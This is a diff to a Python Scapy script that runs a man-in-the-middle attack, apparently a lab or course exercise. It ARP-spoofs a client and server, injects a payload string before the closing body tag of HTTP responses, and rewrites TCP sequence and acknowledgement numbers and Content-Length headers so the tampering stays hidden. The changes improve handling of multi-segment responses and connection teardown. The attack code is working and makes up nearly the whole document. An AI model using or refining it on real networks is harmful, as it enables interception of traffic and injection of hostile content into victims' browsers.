@@ -53,7 +53,7 @@ def restore(srcIP, srcMAC, dstIP, dstMAC):
 
 # TODO: handle intercepted packets
 def interceptor(packet):
-	global clientMAC, clientIP, serverMAC, serverIP, attackerMAC, script, portLength
+	global clientMAC, clientIP, serverMAC, serverIP, attackerMAC, script, portLength, resetPort, multiRes
 	if packet[Ether].src == attackerMAC:
 		return
 	
@@ -61,31 +61,29 @@ def interceptor(packet):
 	if packet.haslayer(IP) and packet[Ether].dst == attackerMAC:
 		if packet[IP].src == clientIP and packet[IP].dst == serverIP:
 			# Request from client to server
+			oriAck = 0
 			if packet.haslayer(TCP):
 				if packet[TCP].sport in portLength:
 					# Change ackowledgement number to what server wants to see.
 					# Record ackowledgement number from the request.
 					portLength[packet[TCP].sport][0] = packet[TCP].ack
+					oriAck = packet[TCP].ack
 					for index, element in enumerate(portLength[packet[TCP].sport]):
 						if index > 0:
 							packet[TCP].ack = packet[TCP].ack - element
-					#packet[TCP].ack = packet[TCP].ack - portLength[packet[TCP].sport][1]
 				if packet[TCP].flags != "FA":
 					print("# Request")
-					print(f"\tflags: {packet[TCP].flags}")
-				if packet[TCP].flags == "FA" and packet[TCP].sport in portLength:
-					# Close TCP connection and hange ackowledgement number
-					# to what server wants to see.
+				elif packet[TCP].flags == "FA":
 					print("# Finish")
-					print(f"\tflags: {packet[TCP].flags}")
-					portLength[packet[TCP].sport][0] = packet[TCP].ack
-					for index, element in enumerate(portLength[packet[TCP].sport]):
-						if index > 0:
-							packet[TCP].ack = packet[TCP].ack - element
-					#packet[TCP].ack = packet[TCP].ack - portLength[packet[TCP].sport][1]
+				if packet[TCP].sport in resetPort:
+					if packet[TCP].sport in portLength:
+						portLength.pop(packet[TCP].sport)
+					resetPort.pop(packet[TCP].sport)
+				print(f"\tflags: {packet[TCP].flags}")
 				print(f"\tsrc: {packet[TCP].sport}")
 				print(f"\tseq: {packet[TCP].seq}")
-				print(f"\tack: {packet[TCP].ack}")
+				print(f"\told ack: {oriAck}")
+				print(f"\tnew ack: {packet[TCP].ack}")
 				if packet[TCP].sport in portLength:
 					print(f"\t{packet[TCP].sport}:{portLength[packet[TCP].sport]}")
 				del packet[IP].len
@@ -98,26 +96,48 @@ def interceptor(packet):
 				sendp(frag)
 		elif packet[IP].src == serverIP and packet[IP].dst == clientIP:
 			# Response from server to client
+			oriSeq = 0
 			if packet.haslayer(Raw):
 				# Add payload.
 				httpLoad = packet[Raw].load.decode('utf-8')
 				httpLoad = httpLoad.replace('</body>', payload + '</body>')
+				
+				# Change sequence number to what client wants to see.
 				if packet[TCP].dport in portLength:
-					# Change sequence number to what client wants to see.
-					packet[TCP].seq = portLength[packet[TCP].dport][0]
+					oriSeq = packet[TCP].seq
+					if packet[TCP].dport in multiRes:
+						# If it is not first segment, rebase it.
+						# Only rebase it if it is not in first response.
+						diff = packet[TCP].seq - multiRes[packet[TCP].dport]
+						if portLength[packet[TCP].dport][0] != 0:
+							packet[TCP].seq = portLength[packet[TCP].dport][0] + diff
+					else:
+						# Sequence number of first segment is acknowledgement number from request.
+						packet[TCP].seq = portLength[packet[TCP].dport][0]
+				
+				# Store sequence number of first segment.
+				if packet[TCP].dport not in multiRes:
+					if oriSeq == 0:
+						multiRes[packet[TCP].dport] = packet[TCP].seq
+					else:
+						multiRes[packet[TCP].dport] = oriSeq
+				
+				# Clear record if it is last segment.
+				if packet[TCP].flags == "PA" and packet[TCP].dport in multiRes:
+					multiRes.pop(packet[TCP].dport)
+				
+				# Change content length in http header.
 				try:
-					# Change content length in http header.
 					loadSubString = httpLoad.split()
 					index = loadSubString.index('Content-Length:')
 					length = int(loadSubString[index+1])
 					newLength = length + len(payload)
 					lenDiff = len(payload) + len(str(newLength)) - len(str(length))
 					if packet[TCP].dport in portLength:
-						# Change sequence number to what client wants to see.
 						# Record original content length of http load, length difference and
 						# increment number of responses.
-						packet[TCP].seq = portLength[packet[TCP].dport][0]
-						portLength[packet[TCP].dport].append(lenDiff)
+						if packet[TCP].flags != "FA":
+							portLength[packet[TCP].dport].append(lenDiff)
 					else:
 						# Record original content length of http load, length difference and
 						# first response.
@@ -132,15 +152,19 @@ def interceptor(packet):
 			elif packet.haslayer(TCP):
 				if packet[TCP].dport in portLength:
 					# Change sequence number to what client wants to see.
+					oriSeq = packet[TCP].seq
 					packet[TCP].seq = portLength[packet[TCP].dport][0]
 				del packet[IP].len
 				del packet[IP].chksum
 				del packet[TCP].chksum
 			if packet.haslayer(TCP):
+				if packet[TCP].flags == "FA":
+					resetPort[packet[TCP].dport] = True
 				print("# Response")
 				print(f"\tflags: {packet[TCP].flags}")
 				print(f"\tdst: {packet[TCP].dport}")
-				print(f"\tseq: {packet[TCP].seq}")
+				print(f"\told seq: {oriSeq}")
+				print(f"\tnew seq: {packet[TCP].seq}")
 				print(f"\tack: {packet[TCP].ack}")
 			if packet[TCP].dport in portLength:
 				print(f"\t{packet[TCP].dport}:{portLength[packet[TCP].dport]}")
@@ -171,6 +195,10 @@ if __name__ == "__main__":
 	
 	# dictionary of [ack from request, 1st lenDiff, 2nd lenDiff, ...]
 	portLength = {}
+	
+	resetPort = {}
+	
+	multiRes = {}
 
 	# start a new thread to ARP spoof in a loop
 	spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
